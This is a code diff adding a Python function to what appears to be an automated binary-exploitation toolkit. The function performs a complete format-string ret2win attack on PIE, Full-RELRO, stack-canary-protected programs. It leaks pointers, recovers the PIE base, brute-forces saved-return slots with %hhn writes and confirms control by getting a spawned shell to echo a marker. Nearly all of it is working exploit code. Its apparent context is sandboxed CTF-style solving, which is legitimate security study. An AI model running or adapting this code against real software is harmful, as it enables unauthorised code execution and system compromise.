@@ -1259,6 +1259,144 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                                    "a PIE base from the same leak, or the redirect did not confirm"}
 
 
+def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
+                   gate_prefix: bytes = b"", base_argv=(), marker: bytes = b"LYKOS-FMT-9931",
+                   timeout: float = 10.0, mem_mb: int = 2048) -> dict:
+    """Format-string -> ret2win on a PIE + Full-RELRO target (GOT read-only, so a %n must hit a
+    SAVED RETURN on the stack, not a GOT slot). Needs a LOOPING printf(user) sink: iteration 1 does a
+    `%N$p` leak, iteration 2 does the `%hhn` write, then the function returns through the overwritten
+    slot. A targeted %n to the return does NOT cross the stack canary (no overflow), so this works on
+    a canary-protected target too. In ONE process (ASLR forces same-process use):
+      leak -- recover the PIE base from the image pointers the dump spills (recover_pie_base), and
+              collect the stack-pointer values (frame pointers; a saved return sits at frame_ptr+8);
+      write -- fmtstr_payload plants `pie_base + win_off` at a candidate (stack_ptr + delta).
+    The exact frame-pointer->return delta is layout-specific, so SWEEP the leaked stack pointers x a
+    few deltas and let a spawned-shell marker pick the slot that actually redirects (never guessed
+    blindly). Confirmed by a shell echoing `marker`. Returns {ok, pie_base, win, target} or
+    {ok: False, reason}. `gate_prefix` is any bytes that must precede the payload to reach the sink.
+
+    The probe must FIT the sink's read size (`read_cap`): too long a `%p` dump spills past the read
+    and desyncs the loop. A big input buffer also pushes the saved frame off the low slots, so the
+    probe reads a DEEP slot window that starts past the buffer (fmt_offset + buffer-in-slots) where
+    the image / frame / libc pointers actually sit. `fmt_offset` (where the payload lands in printf's
+    varargs) is calibrated once in a throwaway process -- it is an ASLR-invariant layout constant."""
+    import re as _re
+
+    from . import exploit as _exploit
+    from . import fmt as _fmt
+    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    hexrx = _re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
+    MARK = 0x4141414141414141
+
+    def _spawn():
+        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
+                                     chdir=(exedir if rel else "")) + [str(exe)] + argv
+        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                preexec_fn=preexec)
+
+    def _dump(p, lo, hi):
+        """Send one `%lo$p .. %hi$p` dump (sized under read_cap) and return {slot: value}."""
+        body = gate_prefix + b" ".join(b"%%%d$p" % i for i in range(lo, hi + 1)) + b"\n"
+        try:
+            p.stdin.write(body)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return {}
+        out = _read_until(p, time.time() + timeout / 2)
+        vals = {}
+        for i, tk in enumerate(hexrx.findall(out), lo):
+            if tk != b"(nil)":
+                try:
+                    vals[i] = int(tk, 16)
+                except ValueError:
+                    pass
+        return vals
+
+    # Calibrate fmt_offset once (throwaway process): marker + a short low dump -> the slot whose
+    # printed value is the marker is where our buffer lands in printf's varargs.
+    if not fmt_offset:
+        q = _spawn()
+        try:
+            _read_until(q, time.time() + 0.5)
+            try:
+                q.stdin.write(gate_prefix + struct.pack("<Q", MARK) + b"|"
+                              + b" ".join(b"%%%d$p" % i for i in range(1, 25)) + b"\n")
+                q.stdin.flush()
+            except (BrokenPipeError, OSError):
+                pass
+            fmt_offset = _fmt.find_fmt_offset(_read_until(q, time.time() + timeout / 2), marker=MARK)
+        finally:
+            _kill(q)
+            try:
+                q.wait(timeout=2)
+            except Exception:                            # noqa: BLE001
+                pass
+    if not fmt_offset:
+        return {"ok": False, "reason": "format-string ret2win: could not calibrate the varargs "
+                                       "offset (no reachable printf(user) sink?)"}
+
+    # Deep window: skip the buffer (fmt_offset + buffer-in-slots) and read as many slots as fit the
+    # read, so the image / frame / libc pointers past the buffer are captured in ONE read.
+    per = 8                                              # bytes per "%NNN$p " directive, ~roomy
+    width = max(8, min(40, (read_cap - len(gate_prefix)) // per))
+    deep_lo = int(fmt_offset) + (read_cap // 8) + 1
+
+    deltas = (8, 0, 16, -8, 24, -16, 32, 40)
+    for cand_idx in range(width):
+        for delta in deltas:
+            p = _spawn()
+            try:
+                _read_until(p, time.time() + 0.5)        # banner
+                vals = _dump(p, deep_lo, deep_lo + width - 1)   # iteration 1: deep leak
+                image = [v for v in vals.values() if 0x550000000000 <= v < 0x600000000000]
+                pie_base = _exploit.recover_pie_base(image, target_bytes, allow_single=True)
+                if not pie_base:
+                    break                                # no image pointer in this window -> stop
+                stacks = [v for s, v in sorted(vals.items())
+                          if 0x7F0000000000 <= v < 0x800000000000]
+                if cand_idx >= len(stacks):
+                    break                                # exhausted the leaked stack pointers
+                target = stacks[cand_idx] + delta
+                win = pie_base + int(win_off)
+                try:
+                    payload = _fmt.fmtstr_payload(int(fmt_offset), {target: win})
+                except ValueError:
+                    continue
+                if len(gate_prefix) + len(payload) + 1 > read_cap:
+                    continue                             # write payload must fit the read too
+                try:                                     # iteration 2: the %hhn write
+                    p.stdin.write(gate_prefix + payload + b"\n")
+                    p.stdin.flush()
+                    time.sleep(0.2)
+                    p.stdin.write(b"echo " + marker + b"\n")   # a spawned shell evaluates this
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                out = _read_until(p, time.time() + timeout, quiet=1.2)
+                if marker in out or b"/bin/sh" in out or b"$ " in out:
+                    return {"ok": True, "pie_base": pie_base, "win": win, "target": target,
+                            "fmt_offset": int(fmt_offset),
+                            "output": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for s in (p.stdin, p.stdout):
+                    try:
+                        if s is not None:
+                            s.close()
+                    except Exception:                    # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                        # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "format-string ret2win: leaked a PIE base but no (stack ptr, delta) "
+                                   "redirected control to win (frame layout? sink not looping?)"}
+
+
 def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, system_off, binsh_off,
                         leak_recipe=None, canary_trigger=b"", canary_offset=None, ret_offset=None,
                         canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
